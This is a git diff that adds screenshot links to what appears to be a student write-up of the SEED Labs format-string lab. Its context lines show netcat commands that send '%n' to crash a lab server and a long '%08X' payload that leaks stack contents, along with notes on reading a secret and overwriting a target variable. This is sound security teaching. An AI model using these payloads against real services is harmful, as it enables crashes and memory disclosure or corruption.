@@ -14,6 +14,7 @@ We then opened two terminals, one with the server using Docker from Seed Labs an
 ```bash
 $ echo 'hello' | nc 10.9.0.5 9090
 ```
+ ![hello](/docs/images/hello.png)
 
 The server returned necessary information for the following tasks:
 - Input buffer address
@@ -28,6 +29,7 @@ To crash the server, we sent the following input:
 ```bash
 $ echo '%n' | nc 10.9.0.5 9090
 ```
+ ![crash](/docs/images/crash.png)
 
 The format string attempts to write with %n to a memory address outside the allowed address space of the process caused a crash, resulting in a segmentation fault. The absence of the "Returned properly" message confirmed the server had crashed.
 
@@ -41,6 +43,8 @@ Our initial approach was to input "DJLD" concatenated with multiple "%08x" forma
 ```bash
 echo "DJLD%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X" | nc 10.9.0.5 9090
  ```
+
+![letters](/docs/images/letters.png)
 
 The final "444C4A44" is the address of our input "DJLD". Observing that each address has 8 characters (32-bit addresses), we determined there are 63 stack addresses between the format string and the buffer. Thus, a string with exactly 64 "%x" is needed to print the initial 4 bytes of the input.
 
@@ -70,6 +74,8 @@ And then run it:
 ./func
 ```
  
+ ![secret](/docs/images/secret.png)
+
 The server confirmed the message at this address is  "A secret message."
 
 
@@ -92,6 +98,9 @@ int main() {
     return 0;
 }
 ```
+
+ ![change](/docs/images/change.png)
+
 The target value changed.
 
 
@@ -112,6 +121,9 @@ int main() {
 }
 
 ```
+
+ ![5000](/docs/images/5000.png)
+
 The target variable was now 0x00005000.
 
 
